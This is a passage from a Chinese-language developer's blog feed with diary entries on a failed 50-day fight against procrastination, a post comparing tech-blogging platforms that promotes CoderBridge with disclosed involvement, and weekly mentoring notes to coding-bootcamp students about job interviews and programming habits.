的部分，打電話去問說是題目沒辦法授權，還是以官網公告的為主。雖然說非商用直接把題目轉載然後附上出處應該不會有法律問題，但感覺還是有一點道德問題，只好先算了。既然 NPSC 題目不給用，那就自己來出題吧！自己出題的話也能更好掌握題目難度，而且寫廢文本來就是我專長之一，好像沒什麼問題。</p><p>晚上去健身，人超級多，對臥推比較有一點感覺了，深蹲的話也還行，只是平時有點偷懶，真的要再多練練才對…</p><h3 id="Day45：2020–01–09"><a href="#Day45：2020–01–09" class="headerlink" title="Day45：2020–01–09"></a>Day45：2020–01–09</h3><p>（這天居然是空的，完全被遺忘）</p><h3 id="Day46：2020–01–10"><a href="#Day46：2020–01–10" class="headerlink" title="Day46：2020–01–10"></a>Day46：2020–01–10</h3><p>覺得好像撐不了那麼多天繼續寫了，每天寫東西說簡單不簡單，說難也不難。</p><p>還是因為拖延的性格嗎？每次都是隨便寫個兩三分鐘交差就結束了。每天固定騰出 30 分鐘來寫這個困難嗎？好像也不難，但為什麼還是寫不下去呢？不知道，真的不知道。</p><p>看來好像找別的方式來督促自己比較有用，自己督促自己是最沒用而且最天真的方式。</p><h3 id="Day47：2020–01–11"><a href="#Day47：2020–01–11" class="headerlink" title="Day47：2020–01–11"></a>Day47：2020–01–11</h3><p>今天在 OJ 上出了很多題目，頓時發現自己根本就很適合自己出題，因為對我來說其實就只是換個地方寫廢文而已。之後再來找學生測測看這邊的題目難度如何好了，目前是怕有一點太簡單。</p><p>投票比想像中的快，幾乎不用排隊就投到了。</p><h3 id="Day48：2020–01–12"><a href="#Day48：2020–01–12" class="headerlink" title="Day48：2020–01–12"></a>Day48：2020–01–12</h3><p>下午一樣隨意出了一兩題題目，晚上去上英文課。</p><p>沒了，好懶得寫。</p><h3 id="Day49：2020–01–13"><a href="#Day49：2020–01–13" class="headerlink" title="Day49：2020–01–13"></a>Day49：2020–01–13</h3><p>完全懶得寫了，好像應該宣告失敗一下？</p><h3 id="Day50：2020–01–14"><a href="#Day50：2020–01–14" class="headerlink" title="Day50：2020–01–14"></a>Day50：2020–01–14</h3><p>之後把這一系列公開出去，就叫做「我與拖延症對抗的五十天」好了</p><p>然後仔細講講自己這五十天中的變化，一度激起熱情但是過幾天就燒完了。明明開始之前覺得「每天寫五分鐘一點都不難」，一天不是有很多時間嗎？但有時間是一回事啊，想不想做事情是一回事。你可以有很多事情卻不想做事情，這才是最真實的樣貌。</p><p>就算你有時間寫，但不想寫就是不想寫，不會因為你有沒有時間而改變。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提早出關，大家安安</title>
      <link href="/2020/02/03/i-failed-9386c6b0a681/"/>
      <url>/2020/02/03/i-failed-9386c6b0a681/</url>
      
        <content type="html"><![CDATA[<p>去年 12 月 1 號，我在 Medium 發了這麼一篇文：<a href="/2019/12/01/best-one-year-696aa373207d/">閉關修煉，一年後見</a></p><p>大意就是我要進行為期一年的閉關修煉，希望能重拾以前學生時期準備大考的狀態，潛心修練，把自己一直想要補強卻一直偷懶的東西都補齊。</p><p>如果要用電影的畫面來想像，大概就是那種初出茅廬的主角被冠軍配角打趴之後痛定思痛，然後進行修煉，修煉三個月之後跟冠軍配角單挑最後打贏了的那種感覺。</p><p>不過就像標題所講的，閉關結束了，我失敗了。</p><p>直接來講一下閉關失敗的一些心得。</p><p>首先，我不後悔閉關，也不覺得閉關失敗是什麼大不了的事。我試過了，也相信自己可以，但最後事實證明我不行。</p><p>若是我成功了，我會這樣跟大家說：</p><blockquote><p><em>雖然說轉個心境就把自己的拖延症治好很難，但我成功了。我靠著 XXX 跟 OOO 這些方法，讓我在一年中專心研究那些想研究的題目，一年過後，我變得超級強。</em></p></blockquote><p>但我失敗了，所以只能跟大家這樣說：</p><p>沒有外在的壓力，只靠自己是很難改變的。活了二十五年都沒有改變，都沒有去做到的事，為什麼會覺得這是一朝一夕就可以改變的？到底憑什麼？</p><p>憑著一股信念。</p><p>可是這股信念十年前沒有改變你、五年前沒有改變你、每一次出現時都沒有改變你，為什麼這一次不一樣？對，這一次沒有不一樣。</p><p>每個人都有適合自己的方式，閉關修煉不是適合我的。</p><p>對我來說，「我想改變」是沒有用的，一點用都沒有。想減肥、想健身、想培養運動習慣；想認真念演算法、想認真念 JavaScript、想認真把本科系的課修好——這些事情想了多少次了？</p><p>但沒有用就是沒有，關於這件事情，其實我在以前寫的<a href="/2018/09/26/procrastination-ba12754ada49/">《致跟我一樣的拖延症患者：動力是需要刻意創造的》</a>這篇文章裡已經講過了。而閉關修煉，是因為我想再試一次，憑著「我想改變」這個信念，有沒有辦法做事。</p><p>事實證明沒有。</p><p>所以我放棄了，我不要閉關了，閉關不會讓我變得更好，跟其他曇花一現的衝動做事差不多，只能持續一兩個月，然後就結束了。</p><p>我仔細想過一遍，閉關修煉之所以沒有用，是因為我打從心底就不相信我想進步的那些東西是必須的。換句話說，就算我不認真學演算法，不認真理解 JavaScript，不去培養運動習慣，我都覺得無所謂。</p><p>因為我還是可以過得很好。</p><p>那既然可以過得很好，幹嘛讓自己這麼累？</p><p>所以我失敗了，事情就是這樣。</p><h3 id="那之後呢？"><a href="#那之後呢？" class="headerlink" title="那之後呢？"></a>那之後呢？</h3><p>這次閉關修煉失敗以後，我對自己拖延症的掌握度又更高了。</p><p>以我的狀況來說，靠自己是沒用的；創造外部壓力來督促自己，才是最好的選項。</p><p>所以呢，之後我會把重心放在 <a href="http://lidemy.com/">Lidemy</a> 的相關教學計畫上面。透過教學以及公開活動強迫自己成長——這是我目前能找到的最有效的方式。</p><p>這幾天會對外公開 Lidemy 今年的計畫，但基本上就是三個：</p><ol><li>之前提過的《先別急著寫 leetcode》線上課程</li><li>JS 核心觀念實體課程</li><li>程式導師實驗計畫第四期！</li></ol><p>就是這樣，敬請期待。</p><p>話說如果你對我閉關這幾天做了什麼有興趣，可以參考：<a href="/2020/02/02/fight-against-procrastination-but-lost-b43d3c4164e1/">我與拖延症對抗的五十天</a>。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寫技術部落格不需要那麼大費周章</title>
      <link href="/2020/01/28/tech-blog-coderbridge-to-the-rescue-2ba5b52d8bcd/"/>
      <url>/2020/01/28/tech-blog-coderbridge-to-the-rescue-2ba5b52d8bcd/</url>
      
        <content type="html"><![CDATA[<p>身為一個喜歡寫東西而且從中獲益的人，會一直推廣寫作這回事並不意外，像是之前就有寫過幾篇相關的文章：</p><ol><li><a href="/2019/08/22/how-do-i-write-965328ae91fe/">我是如何完成一篇文章的？</a></li><li><a href="/2019/02/06/why-blogging-ab77fd8c6ffa/">每一篇心得都有價值  — — 為什麼初學者才更應該要寫心得筆記</a></li><li><a href="/2018/06/13/blog-e7a23a74ae2b/">我為什麼寫部落格，以及部落格帶給我的影響</a></li></ol><p>但同時，我也在寫作上面碰到了許多問題。</p><p>最困擾我的，也困擾著許多人的一個問題就是：</p><blockquote><p>我該寫在哪裡？</p></blockquote><p>底下就先來分享我自己的經歷。</p><h4 id="人生中第一個部落格：自架-Wordpress"><a href="#人生中第一個部落格：自架-Wordpress" class="headerlink" title="人生中第一個部落格：自架 Wordpress"></a>人生中第一個部落格：自架 Wordpress</h4><p>那時大概是 2008 年左右，跟一個朋友合作架起了 Wordpress。那時候想寫 blog，Wordpress 大概是首選，而且自己架起來滿簡單的。</p><p>使用過程上其實並沒有太大的問題，最後會停掉是因為太偷懶了。大概只寫了十篇文章左右就懶得更新，然後主機到期，部落格也就這樣死掉了。</p><p>後來有嘗試使用了 Wordpress 自己的 hosting，不用自己架，也不用擔心主機會到期。可以客製化的東西很多沒錯，但有時候這反而是一個缺點，因為太麻煩了。</p><h4 id="第二個部落格：logdown"><a href="#第二個部落格：logdown" class="headerlink" title="第二個部落格：logdown"></a>第二個部落格：logdown</h4><p>到了 2014 年，聽說有一個很適合技術人員寫作的平台叫做 logdown，體驗了一下之後驚為天人，一試成主顧，我一直都很喜歡這個產品。</p><p><img src="/img/tech-blog-coderbridge-to-the-rescue-2ba5b52d8bcd/1__CsZVUCWKYPXo36dXZhVPgQ.png"></p><p>喜歡的原因很簡單，因為這平台讓你專注在寫作。</p><p>我理想中的寫作平台以下幾點是必備的：</p><ol><li>方便上傳圖片</li><li>版面清晰簡潔，要有分類以及文章目錄功能</li><li>可以留言</li></ol><p>以下幾點是有了會很好的：</p><ol><li>可以匯出文章</li><li>可以自訂版面</li><li>可以自訂網址</li></ol><p>而 logdown 幾乎全部都符合了，所以我在這個平台從 2014 一路待到 2017，在這當中也累積了不少流量，體會到什麼叫做「文章排在 Google 搜尋第一名」的感覺。</p><p><img src="/img/tech-blog-coderbridge-to-the-rescue-2ba5b52d8bcd/1__bfnn3i4mbfhXd5832HZ7Zg.png"></p><p>從 2014 年累積到現在，一共有 160 萬的 PV，87 萬的 UV。</p><p>後來為什麼離開呢？因為 logdown 沒有在維護了，是個隨時都會死掉的平台。待在一個隨時會掛掉的平台風險太高，只好再尋覓其他地方。</p><h4 id="第三個部落格：hexo-自架"><a href="#第三個部落格：hexo-自架" class="headerlink" title="第三個部落格：hexo 自架"></a>第三個部落格：hexo 自架</h4><p>身為一個開發者，自己架部落格似乎變成一件稀鬆平常的事，而且通常都是用 hexo 來架，並且 host 在 GitHub 上面。那時候我想說：好，我也來自己架一個吧，反正現在自己架部落格其實也不難。</p><p>但在這過程中我碰到最大的問題是：</p><ol><li>沒有線上編輯器的介面，所以上傳圖片跟保存草稿都有點麻煩</li><li>要找到好看的版型並不容易，要自己改成本也不小</li><li>比起部落格平台，還是有點不方便</li></ol><p>因為這三點的關係，那個自架的部落格就沒有在用了，我只有把舊的文章放過去，接著就完全死在那邊沒有動，我記得好像只有一篇新文章而已（就是慶祝搬家成功之類的，殊不知只有把舊家搬到新家，可是卻沒有親自入住新家）。</p><h4 id="第四個部落格：Medium"><a href="#第四個部落格：Medium" class="headerlink" title="第四個部落格：Medium"></a>第四個部落格：Medium</h4><p>後來我就發現 Medium 並且來到這裡了，整體的感覺還滿滿意的。雖然一度有思考過<a href="/2019/06/04/freecodecamp-hackernoon-are-leaving-medium-1b7319d7a8a7/">要不要離開</a>，但最後還是因為方便性留下來了。</p><p>不過有一點要特別注意，因為 Medium 不適合寫技術類文章，所以我都在 Medium 上面發表「不太需要什麼程式碼」的文章，而那些需要展示程式碼的文章，還是需要一個地方來放。</p><p>所以從這個時間點開始，我的部落格開始分流了。Medium 偏科普文與日常，技術部落格則是只有技術，而且是比較硬的，需要很多程式碼的技術。</p><h4 id="第五個部落格：GitHub-Issues"><a href="#第五個部落格：GitHub-Issues" class="headerlink" title="第五個部落格：GitHub Issues"></a>第五個部落格：GitHub Issues</h4><p>這招是從中國人那邊學來的，直接開一個 GitHub 的 repo，把 Issue 功能當作部落格來用。</p><p><img src="/img/tech-blog-coderbridge-to-the-rescue-2ba5b52d8bcd/1__c4JaWIbXGuXBPObSxlRsHg.png"></p><p>一開始用得滿開心的，優點如下：</p><ol><li>可以把星星當作一個人氣指標（滿足虛榮心）</li><li>Issue 完美支援程式碼與插入圖片</li><li>內建評論系統與通知</li><li>別人的 issue reference 到你的文章時會有提示</li></ol><p>不過用了一陣子發現最大的缺點是 SEO，SEO 極差。而且這個缺點在推廣上滿致命的，所以後來就只能尋找其他地方。</p><h4 id="第六個部落格：重回-hexo"><a href="#第六個部落格：重回-hexo" class="headerlink" title="第六個部落格：重回 hexo"></a>第六個部落格：重回 hexo</h4><p>最後還是回到 hexo 了。</p><p>麻煩歸麻煩，但也沒辦法。而版面的問題後來找到一個很滿意的，於是這個問題就解掉了。而客製化的問題後來發現自己技術進步了，要客製化滿容易的，於是這問題也解掉了。</p><p><img src="/img/tech-blog-coderbridge-to-the-rescue-2ba5b52d8bcd/1__mQeMvkR9hSgYoJgGxo8jAA.png"></p><p>但缺點依舊在，那就是要發文還是比較麻煩。除了寫作以外，我必須要專心在其他事情上面。</p><p>只是想寫個技術部落格而已，有必要這麼麻煩嗎？</p><h4 id="CoderBridge-to-the-Rescue"><a href="#CoderBridge-to-the-Rescue" class="headerlink" title="CoderBridge to the Rescue"></a>CoderBridge to the Rescue</h4><p>首先，前面我提到技術部落格的時候，我都只關注到了自己。我並沒有提到社群這件事，而這些元素在自架的部落格當中都是沒辦法實現的，畢竟整個網站就你一個人嘛。</p><p>而 Medium 除了是一個部落格平台以外，你還可以看到其他人寫什麼，這就是跟自架部落格最大的不同點。</p><p>如果有一個類似 Medium 的平台，但能夠很完整地支援技術寫作（像是 Markdown 跟插入程式碼等等），那不是很不錯嗎？</p><p>我剛好知道一個，叫做 <a href="https://www.coderbridge.com/">CoderBridge</a>。</p><p><img src="/img/tech-blog-coderbridge-to-the-rescue-2ba5b52d8bcd/1__9Y9CRIm02GY3__otwDGxR5g.png"></p><p>如果要用一句話來形容 CoderBridge，我會想這樣講：</p><blockquote><p>技術部落格界的 Medium</p></blockquote><p>但它不只如此。</p><p>你在 Medium 上面發佈的文章，任何人都看得出來是 Medium 這個平台。寫作的時候我個人其實滿討厭一件事，就是作者被隱藏了，或是很不明顯。例如說那種週刊的網站，你可能只會記得是在某某週刊看到某篇文章，但是卻忘記作者是誰。</p><p>Medium 有 Publication，但其實跟個人帳號的差異沒有到很大，頂多就是能客製化版面，但是文章頁面還是差不多的。</p><p>我跟幾個夥伴一起經營的 <a href="https://blog.techbridge.cc/">TechBridge 部落格</a>你有看過嗎？沒看過的話讓你看看：</p><p><img src="/img/tech-blog-coderbridge-to-the-rescue-2ba5b52d8bcd/1__5iwA__FTL7cP4s3SlfUsy__g.png"></p><p>看到這張截圖，你可能會想說：「不就是自己用 hexo 架的嗎，然後呢？」</p><p>然後，其實不是。原本是放在 hexo 沒錯，但前陣子已經悄悄地移植到 CoderBridge 平台了。</p><p>也就是說，CoderBridge 除了把文章放在平台上面，你也可以選擇建一個自己的部落格，把文章發表在上面。<strong>所以從外界看起來，這就是你自己的部落格。</strong></p><p>你可以取自己的名稱，放自己的 header，客製化自己的 About 介紹，讓別人知道你是誰，而不是只有 CoderBridge 這個平台。</p><p>目前這個功能採取邀請審核制，是我相當期待正式對外開放的新功能。還有一點很重要，那就是支援輸入以及輸出文章，若是哪天你真的想出去自立門戶，可以直接把文章帶著走，不必擔心被綁在這裡。</p><p><img src="/img/tech-blog-coderbridge-to-the-rescue-2ba5b52d8bcd/1__YJJCmZsXaqaQQNKlgnz44g.png"></p><p>CoderBridge 是一個為開發者而生的平台，背後的開發者自己也是開發者（這句好饒口），所以所有寫技術部落格會碰到的事情，他們也都碰過。例如說在編輯器的使用者體驗上就花了很多功夫，盡力調整到最好。</p><p>除此之外，近日也舉辦了：<a href="https://www.accupass.com/event/2001190943344186137000">第 01 屆開發者寫作松 Coder Blogathon</a> 這個活動。</p><p>簡單來說，從 2&#x2F;23 到 2&#x2F;29，連續七天都必須發表文章，可以針對某一個主題來寫作。你知我知獨眼龍也知，你跟我都很懶惰。若是沒有外在壓力，可能根本就沒有幹勁提起鍵盤來寫文章。</p><p>所以透過這樣的活動，把你對某一項知識的理解寫出來，可以是原理探索，也可以是教學文，只要跟技術相關就好。詳細的活動說明在上面的連結，可以點下去看細節然後順便按個報名。</p><p>目前這個平台才剛起步，還有很多想做的功能正在開發中，日後會變得逐漸完整，但我滿看好這個平台未來的發展（利益揭露一下，我是 CoderBridge 團隊中的一員，所以使用上有碰到什麼問題都可以直接來問我）。</p><p>若是你在寫技術部落格的時候有碰到跟我一樣的問題，覺得自己架實在很麻煩，想要找個地方讓你能快速開始寫作的話，歡迎來試試看 <a href="https://www.coderbridge.com/">CoderBridge</a>；如果提不起動力開始寫作，趕快來報名<a href="https://www.accupass.com/event/2001190943344186137000">第 01 屆開發者寫作松 Coder Blogathon</a> ，讓活動推著你前進，讓我們一起前進。</p><p>Happy coding, happy writing!</p>]]></content>
      
      
      <categories>
          
          <category> 寫作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寫作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式導師實驗計畫隨意聊總集（下）</title>
      <link href="/2020/01/13/weekly-note-part3-87969dd50929/"/>
      <url>/2020/01/13/weekly-note-part3-87969dd50929/</url>
      
        <content type="html"><![CDATA[<p>上中傳送門：</p><p>上集：[&#x2F;2019&#x2F;12&#x2F;26&#x2F;weekly-note-part1-197335682a61&#x2F;)<br>中集：[&#x2F;2020&#x2F;01&#x2F;12&#x2F;weekly-note-part2-20fb2472d432&#x2F;)</p><h4 id="第二十六週"><a href="#第二十六週" class="headerlink" title="第二十六週"></a>第二十六週</h4><p>因為計劃接近尾聲，進度較快的那群同學之後就要出去面試了<br>看得出來大家好像對面試滿沒有信心的<br>我想說的是，這很正常啊，這超級正常<br>我第一次出去面試的時候也滿沒有信心的，想說自己還很多地方不足<br>心得可以看這邊：<a href="https://www.ptt.cc/bbs/Soft_Job/M.1431190145.A.D28.html">https://www.ptt.cc/bbs/Soft_Job&#x2F;M.1431190145.A.D28.html</a></p><p>所以才會建議大家先去投一些沒有很想去的公司當練習試試水溫<br>自信會從什麼時候開始？從你拿到第一個 offer 開始<br>那一刻你會知道自己是可以找到工作的，然後信心就起來了，之後就會更有自信<br>然後就會進入一個正面循環，有自信 &#x3D;&gt; 找到工作 &#x3D;&gt; 更有自信 &#x3D;&gt; 更好的工作<br>推薦大家都先去試試水溫，至少面個四五間左右再去挑戰真的有興趣的公司</p><p>然後關於履歷的部分我覺得不用太過擔心<br>畢竟第一份工作而已，我覺得履歷不要太差都滿有機會的<br>履歷只是讓你拿到面試的機會而已，真正面試還是憑實力</p><p>對於進度還沒到可以找工作的同學們也不用太過擔心<br>反正前面同學當前鋒去試試水溫也不錯，結果是好是壞都可以讓你們有個參考<br>就繼續跟著自己步調前進就好了，離計畫真正結束還有兩個月，還有時間<br>之前 Amelie 講的一句話很不錯：「放棄的那一刻，才是轉職失敗」<br>所以計劃的時限也只是個參考，就算過了那個時限其實也不會怎樣</p><p>最後跟大家分享一個寫程式時很重要的觀念，那就是一致性<br>例如說變數命名，你分隔要用底線就全部用底線，你開頭小寫就全部小寫<br>不要又 Num 又 thisIsNumber 又 this_is_number<br>這個就叫做沒有一致性，是很差的習慣，這種一看就知道是爛 code</p><p>以 JS 來說，變數跟函式的命名通常都是 camelCase，小寫開頭，分隔用大寫<br>如果有些確認不會變的常數，會用全大寫例如說 PI &#x3D; 3.14<br>Class 的話開頭要大寫然後不會有複數，例如說 class Car，不是 class car 也不是 class Cars，是 class Car<br>大概就簡單掌握這幾個概念就好</p><p>最後關於學習，其實從很多同學的心得中都可以看出來<br>當你看教學看得一臉問號的時候，就去實作，隨意亂做一波<br>然後再回來看教學，會發現好像多懂一點，就再跑去實作<br>這樣來來回回幾次之後，你會突然發現：「靠邀，我怎麼懂了」<br>就是這麼神奇的一件事<br>而且你懂了之後過一段時間，就回不去了，你就不會覺得以前那些東西難了<br>這就是為什麼我認為教學困難的點之一<br>同時也是為什麼我覺得應該讓新手來教新手</p><p>這週大概就是這樣，大家 go go go</p><h4 id="第二十七週"><a href="#第二十七週" class="headerlink" title="第二十七週"></a>第二十七週</h4><p>這週的隨意聊有些遲到，主要是因為我到韓國了，開啟了旅遊模式<br>之前在歐洲有幾個因素讓我不是很想出門<br>第一個是大眾運輸沒那麼方便，第二個是出門要找廁所好麻煩<br>第三個是熱門景點會有一堆來詐騙的<br>但到了韓國就沒有這種困擾，導致我前兩天幾乎整天都在外面<br>然後禮拜天禮拜一的時候都在飛機上<br>所以這週隨意聊就遲了點</p><p>按照表訂的時間，課程的進度到上週日為止已經全部結束了<br>一共是 182 天，紮紮實實的半年</p><p>再來回顧一下進度<br>之前跟大家說目前一共有 45 位同學，但我忘記扣掉工程師加強班的了<br>扣掉之後剩下 39 人，底下是目前的進度分佈：</p><p>21<del>24 週：15 人 <br>16</del>20 週：7 人<br>11<del>15 週：9 人<br>06</del>10 週：8 人</p><p>最保守最保守的估計是進度在最前面的只有 10 個人在期限內找到工作<br>加上之前已經就業成功的 3 個同學，找到工作的人就是 33%<br>已經比第二期的 27% 好了XD</p><p>但我比較希望的是進度在前面的有 20 個可以找到工作<br>這樣找到工作的人的比率就是 58%，直接是第二期的兩倍XD</p><p>這邊再提醒一下大家兩個時間點<br>第一個是 12 月 15 日，離現在大約兩個月，這個是求職截止的時間點<br>在這個時間點之前找到工作都要付學費，過了之後就不用了</p><p>因此第二個時間點是 11 月 15 日，求職截止日前的一個月<br>如果那時你的進度已經到了 17 週之後，我都希望大家可以準備履歷然後出去面試一波<br>原因之前說過了，投履歷沒損失，去面試也沒損失<br>如果找到了那很好，代表你現在就具備出去工作的實力了（雖然可能沒那麼紮實）<br>找不到也很好，至少在面試的時候你會知道自己缺什麼，之後就知道要往哪裡去補<br>所以無論結果如何都是好的<br>大概在兩個禮拜後我會再提醒大家要開始準備履歷什麼的</p><p>然後最近應該會有一群人出去求職，在這邊提醒一下幾點注意事項</p><p>第一，請把每週的自我檢測跟簡答題都複習過一遍<br>因為很多都有可能是你之後出去面試會碰到的題目<br>先複習一遍加深印象，順便回憶一下課程</p><p>第二，spectrum 上面的面試題不用每一題都會<br>之前說過了，就算是我也不是每一題都會<br>然後面試時答題是有技巧的，就算被問到不會的題目，也可以想辦法回答相關的主題<br>例如說面試官問你：「你有用過 async&#x2F;await 嗎？」<br>說「沒有」之後，可以接著回答：「但我知道這跟非同步有關，那不如就來講一下我對非同步的理解好了…」<br>之後就從 callback 講到 promise 講到 event loop，講好講滿</p><p>或者是被問到：「你有用過 grid 排版嗎？」<br>回答沒有之後，可以繼續說：「我只用過 flexbox，可以分享一下我使用的經驗嗎？」<br>接著又是一長串的使用心得跟排版心得</p><p>但切記不要偏題得太嚴重啊，例如說對方問你 grid 結果你分享 webpack 心得，我是面試官的話一定把你刷掉 &#x3D; &#x3D;</p><p>第三，完整的作品比小作品好，小作品比沒作品好<br>挑幾個之前的作業或自己做一個完整的 project<br>盡可能複雜到不要一眼就看出來很簡單<br>例如說計算機或是 twitch api 這種就不要再放了<br>這種我看到的話也會覺得跟個 hello world 沒兩樣<br>但如果你真的沒其他東西可以放，那也只好放這個了</p><p>第四，靠面試練功，再去面試想要的公司<br>建議大家可以先去面個至少四五間普通的公司<br>熟悉一下面試流程跟那個感覺，讓自己進入狀態<br>之後才去投真的很想去的公司，會讓自己準備得比較充足</p><p>第五，做好心理準備<br>公司要的人不一樣，對面試者的回饋也都會不一樣<br>上一期有學生面試被洗臉的，直接說「我覺得你不適合做這行」<br>但那個同學最後還是找到工作了<br>所以保持自信是很重要的，為了保持自信可以先忽略那些負面評價<br>多多肯定自己</p><p>總之面試就跟你學程式一樣啦<br>還沒接觸的時候覺得好緊張好難<br>寫了一兩個禮拜之後發現好像挺有趣的，其實沒那麼難<br>熟能生巧，多面試幾次就習慣了</p><p>然後面試心得歡迎大家分享在每日進度，但請幫我一個忙順便貼到 spectrum 去<br>好久不見的 spectrum 終於在課程尾聲重出江湖<br>因為那邊比較像是精華區啦，東西可以永久保存<br>貼在那邊之後的人也比較方便尋找</p><p>原本想幫大家灌一些心靈雞湯<br>但我自己本來就不是很喜歡那些東西<br>什麼「堅持到底永不放棄」，「他可以你也可以」之類的話，在我看來都沒什麼意義<br>與其灌一堆雞湯之後發現自己真的做不到，一切都是幻覺<br>還不如正視做不到的自己，好好認清自己就是這樣，再來想想該怎麼改進</p><p>給大家一些負面雞湯好了，分享之前書上看到我很喜歡的一段話<br>我覺得超絕望的，超喜歡❤️</p><blockquote><p>Oh, Hoffnung genug, unendlich viel Hoffnung — nur nicht für uns.<br>噢，這世上是有希望，無窮的希望。只是你我沒有。</p></blockquote><blockquote><p>— Franz Kafka, eine Biograpbie</p></blockquote><h4 id="第二十八週"><a href="#第二十八週" class="headerlink" title="第二十八週"></a>第二十八週</h4><p>之前有同學在問說之後幾週還會不會有隨意聊<br>會啦，除非我不知道要寫什麼，不然應該都會有<br>會一直持續到十一月底或是十二月中之類的</p><p>這一篇拖稿的原因有兩個<br>第一個原因是我前幾天在看《我要準時下班》這個日劇<br>第二個原因是我這幾天在看一個美劇，講劇名怕不小心被雷，就先不講了<br>總之我上週六回來台灣之後懶癌立刻發作<br>完全不想做事情….</p><p>先跟大家公告幾件事情</p><p>第一件事情是這次隨意聊的部分內容我寫在這裡了<br>[&#x2F;2019&#x2F;10&#x2F;29&#x2F;its-just-a-beginning-184b954df8a9&#x2F;)<br>想說寫在 medium 好像比較好，以後還要開其他期的話就不用再寫一次XD</p><p>第二件事情是下一次的直播<br>時間我想一下之後再跟大家說，但很有可能是下週二三其中一天的晚上</p><p>要公告的事情差不多就是上面這樣<br>現在十月底了，當初跟大家說希望出去找工作的最後時間點是十二月初<br>所以還有一個月可以專心學習</p><p>我知道這超級不容易的，畢竟每一期到尾聲都會這樣<br>越到後面就越難跟下去<br>就跟跑步一樣嘛，一開始體力還很充裕，會覺得沒什麼<br>跑到後來體力就越來越少，都靠意志力在撐<br>要繼續還是放棄，都只在一念之間而已</p><p>那些已經撐到現在的同學，再認真一個月就可以出去找工作了<br>如果在課程最後才放棄的話，我自己是覺得有點可惜啦<br>但你要放棄的話我也是沒什麼意見，不過這一放棄很可能就是結束了<br>學習這事情不像跑步，跑步可以停下來再跑<br>可是學習一旦停了下來，就會開始遺忘，慢慢忘記以前教的東西<br>停個半年一年，進度就差不多歸零了XD<br>所以放棄的成本是比較高的<br>大家可以再仔細想想看當初報名計畫的理由<br>然後再決定該怎麼做</p><p>然後很恭喜也很感謝那些先出去面試的同學們<br>熱騰騰的心得分享幫助了很多其他的同學<br>happy coding, happy learning!</p><h4 id="第二十九週"><a href="#第二十九週" class="headerlink" title="第二十九週"></a>第二十九週</h4><p>在接連兩個禮拜的拖稿之後，這週終於不拖了<br>今天是計劃開始後的第 204 天，哇…居然 200 多天了<br>其實沒有想到已經這麼久了，時間真的是不知不覺就會流逝掉</p><p>最近在寫第三期結業的反思跟檢討，雖然還有一個多月才結束，但早點準備總是好事<br>其實每一期結束的時候我都不太想評斷自己這一期做的好或是不好<br>因為我覺得答案一點都不重要<br>無論好還是不好，重點都是之後要怎麼做得更好<br>以第三期的結果來說，我覺得還不夠好（我也不知道會不會有我覺得足夠好的那天）</p><p>話說上禮拜那篇看後來一些同學的回覆，覺得我怎麼那麼厲害都講中了<br>第一個原因是我已經看了第三期，阿前兩期的同學很多也都是後繼無力，想當然第三期也是XDD<br>第二個原因是我自己也是這樣啊<br>這個教學計畫跟其他程式課程的不同點之一<br>大概就是我是以一個活生生的人（？）出現在大家面前吧<br>我會跟大家說我最近又看了那些動畫跟戲劇<br>會跟大家一起拖延症發作，哪裡的課程可以看到老師也一起拖延的<br>還會坦承課程哪些地方做不好哪些可以再加強<br>會跟大家講一些其他老師可能不會跟你說的話</p><p>我不會叫你一定要努力<br>我也不會跟你說什麼學程式才是未來<br>也不會說我覺得每個人都應該當工程師，或者是工程師這職業高人一等<br>因為我不會跟你說我自己都不覺得的事情<br>我只會說你要不要努力都可以，那是你自己的選擇<br>真的很累的話就放棄吧，沒有一定要堅持下去<br>但自己選的要自己負責，就是這樣而已</p><p>比起跟一個高高在上的老師上課<br>我自己覺得我這課程比較像是你大學同學因為興趣開了課然後你去上這樣<br>應該有比較平易近人的感覺（？）</p><p>最近在思考後續的打算<br>沒意外的話之前跟大家提過的閉關修煉是勢在bii行<br>預計會從十二月初或是十二月中開始，細節還沒想好就是了<br>總之基本上會消失一年，不過 slack 還是找得到我<br>對大家來說沒什麼影響啦，馬照跑舞照跳，作業照改，問題照回</p><p>第四期目前是不打算開了，除非我閉關的時候發覺自己拖延症還是很嚴重<br>就會重開第四期，藉此逼迫自己繼續教學，精進技術能力<br>但除了這個因素之外，我也有在想是不是應該要做別的課程<br>例如說從這期跟以往觀察到的狀況，我會覺得在「寫程式」這一塊好像還是有些缺乏的<br>會讓我想說是不是教學方法錯了，是不是其實根本不該從前端開始？</p><p>我有點想複製我自己學習的歷程，一開始就只專注在寫程式這塊<br>前端頂多教 HTML+CSS+JS，其他時間就一直寫 code<br>可能寫一百個小範例或者是一百題簡單的程式題<br>讓大家至少對「寫程式」這件事情是熟練的，能夠把想法轉換成 code<br>接著才來學前端或後端，才來建立整體的概念<br>我也不知道這樣會不會比較好，但聽起來滿有趣的</p><p>不過有想法歸有想法，會不會做出來才是重點<br>我自己很喜歡的一句話是這個：<br>「It’s not about the idea, it’s all about execution.」<br>就算你有什麼很強很屌很猛的 idea，沒有做出來以前都是沒用的<br>重點不是那個 idea，而是執行力，執行才是最困難的</p><p>這週差不多就是這樣啦<br>話說最近小樹屋好像有人數漸增的趨勢<br>如果有些從外縣市上來台北面試順便去小樹屋的同學<br>可以偷偷私訊我一下什麼時候會去<br>我就有很大的機率會被你召喚到小樹屋</p><h4 id="第三十週"><a href="#第三十週" class="headerlink" title="第三十週"></a>第三十週</h4><p>最近看學生求職的心得寫在 medium 上面了：<br>[&#x2F;2019&#x2F;11&#x2F;10&#x2F;about-interview-95bfaa4273ba&#x2F;)</p><p>我剛才有再看了一下大家的進度<br>比較可惜的是有些同學停在二十幾週然後就消失了（？）<br>或者是已經到 18 19 週卻開始失去動力<br>針對這種情況，有一個應該滿有效的小撇步<br>就是趕快整理一下履歷然後出去求職<br>這個之前就一直跟大家說過了，但還是不免俗地要再強調一次<br>有學到十幾週對很多公司而言其實就已經夠了<br>可以花個一兩週，出去面試個四五間公司試試水溫<br>有錄取的話就很棒，沒有的話就可以再回來學習，調整一下學習策略<br>真的是 z&gt;b 的一個做法，強烈推薦</p><h4 id="第三十一週"><a 